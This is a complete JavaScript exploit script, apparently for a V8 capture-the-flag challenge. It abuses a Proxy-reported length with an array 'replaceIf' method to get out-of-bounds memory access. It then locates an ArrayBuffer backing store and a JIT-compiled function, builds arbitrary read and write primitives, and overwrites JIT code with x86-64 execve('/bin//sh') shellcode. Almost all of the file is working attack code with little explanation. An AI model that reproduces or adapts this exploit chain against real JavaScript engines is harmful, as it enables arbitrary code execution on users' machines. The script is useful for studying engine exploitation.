var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

//float -> uint64
function f2u(f)
{
	float64[0] = f;
	return bigUint64[0];
}

//uint64 -> float
function u2f(u)
{
	bigUint64[0] = u;
	return float64[0];
}

function hex(u)
{
	return u.toString(16).padStart(16, "0");
}

function f(){let a;let b;return true;}

/*
It's strange at first the float_array is behind of data_buf, just like:
|----
|data_buf|
|-----
|float_array
|
but it's stable after a few hours.
*/
var target_float_array = new Array(10);
target_float_array.fill(1.1);

var data_buf = new ArrayBuffer(0x1337);
var data_view = new DataView(data_buf);
var next = [f, f, f, f, f, f, f];

var next_off = 0;
var bs_off = 0;

/*
%DebugPrint(target_float_array);
%DebugPrint(data_buf);
%DebugPrint(next);
%SystemBreak();
*/

var float_proxy = new Proxy(target_float_array, {
    get: function(obj, prop) {
        if (prop == 'length')
            return 0xffffffff;
        return obj[prop];
    }
});

//function read_oob(off)
var read_oob = (off) => {
	let n;
	float_proxy.replaceIf(off, function(d){
		n = f2u(d);
		return false;
	}, 0);
	return n;
}

//function write_oob(off, v)
var write_oob = (off, data) => {
	float_proxy.replaceIf(off, function(d){
		return true;
	}, u2f(data));
} 



//searching backing_store
var i = 0;
for(i = 0; i < 4096; i++){
	if( read_oob(i) == 0x0000133700000000n){
		console.log("[+] found backing_store");
		bs_off = i + 1;
		console.log("[+] backing_store: 0x" + hex(read_oob(bs_off)));
		//readline();
		break;
	}
	
	console.log("serching bs: " + i);
}

//searching JSFucntion 
//leaked function
i = 0;
for(i = 0; i < 4096; i++){
	if( read_oob(i) == 0x0000000700000000n ){
		if( read_oob(i+1) != 0 &&
			read_oob(i+1) == read_oob(i+2) &&
			read_oob(i+1) == read_oob(i+3) &&
			read_oob(i+1) == read_oob(i+4) && 
			read_oob(i+1) == read_oob(i+5) &&
			read_oob(i+1) == read_oob(i+6) &&
			read_oob(i+1) == read_oob(i+7) ){
			console.log("[+] found JSFucntion array");
			//readline();
			next_off = i;
			break;
		}
	}
	console.log("serching fun: " + i);
}



function read64(addr){
	write_oob(bs_off, addr);
	let data = data_view.getBigUint64(0, true);//or getFloat64
	return data;
}

/*
There is a problem when you write 8 bytes once, it will be crashed?
So just write the memory byte by byte.
*/
function write(addr, data){
	write_oob(bs_off, addr);
	let u8 = new Uint8Array(data_buf);
	for(let i = 0; i < data.length; i++){
		u8[i] = data[i];
	}
}

//%DebugPrint(data_buf);

fn_elem = read_oob(next_off+1) - 1n;
//to trigger jit
f();
console.log("[+] func_addr: 0x" + hex(fn_elem));
var code_addr = read64(fn_elem+0x30n) - 1n;
console.log("[+] code_addr: 0x" + hex(code_addr));
var jit_addr = code_addr + 0x40n;// where?
console.log("[+] jit_addr: 0x" + hex(jit_addr));

/*
var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
];
*/

var shellcode= [0x6a, 0x3b, 0x58, 0x99, 0x52, 0x48, 0xbb, 0x2f, 
				0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x53,
				0x54, 0x5f, 0x52, 0x57, 0x54, 0x5e, 0x0f, 0x05]

write(jit_addr, shellcode);

f();


//float_elem: 0x2f63ad90d8e1     
//view_buf: 0x2f63ad905759
//next: 0x30f065e0d609 0x0000028d88896c61